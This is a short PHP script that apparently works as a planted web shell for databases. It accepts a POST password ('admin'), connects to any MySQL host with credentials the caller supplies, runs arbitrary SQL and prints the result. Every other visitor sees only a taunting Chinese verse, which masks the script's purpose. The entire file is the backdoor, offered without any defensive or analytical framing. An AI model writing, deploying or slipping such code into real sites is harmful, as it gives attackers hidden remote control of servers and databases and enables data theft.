<?php
header("Content-Type: text/html;charset=UTF-8");
if(isset($_POST['pwd'])&&isset($_POST['host'])&&isset($_POST['user'])&&isset($_POST['password'])&&isset($_POST['command'])){
	if($_POST['pwd']=='admin'){
		$dbhost = $_POST['host'];  // mysql服务器主机地址
		$dbuser = $_POST['user'];            // mysql用户名
		$dbpass = $_POST['password'];          // mysql用户名密码
		$command=$_POST['command'];
		$conn = mysqli_connect($dbhost, $dbuser, $dbpass);
		if(! $conn ){
    		die('数据库连接失败');
		}else{
			echo $dbhost.'数据库连接成功！';
			$zx=mysqli_query($conn,$command);
			$exc=mysqli_fetch_all($zx);
			echo " 执行结果：".$exc[0][0];
			mysqli_close($conn);
		}
	}
}else{
	echo "凡王之血，必以剑终 汝必以痛，偿还儹越 汝必以眼，偿还狂妄 汝必以血，偿还背叛";
}
?>